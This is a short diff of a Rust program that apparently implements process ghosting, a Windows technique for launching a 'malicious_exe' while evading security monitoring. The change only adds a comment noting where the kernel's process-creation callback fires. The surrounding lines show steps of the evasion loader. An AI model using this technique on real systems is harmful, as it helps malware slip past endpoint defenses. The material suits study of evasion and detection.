@@ -78,6 +78,8 @@ fn main() -> Result<()> {
 
     let proc_params = setup_process_parameters(&args.malicious_exe)?;
     link_params_to_ghost_process(&h_process, pbi.PebBaseAddress as usize, proc_params)?;
+
+    // `PsSetCreateProcessNotifyRoutineEx` triggers here!
     let h_ghost = start_ghost_thread(&h_process, entry_point)?;
 
     unsafe {
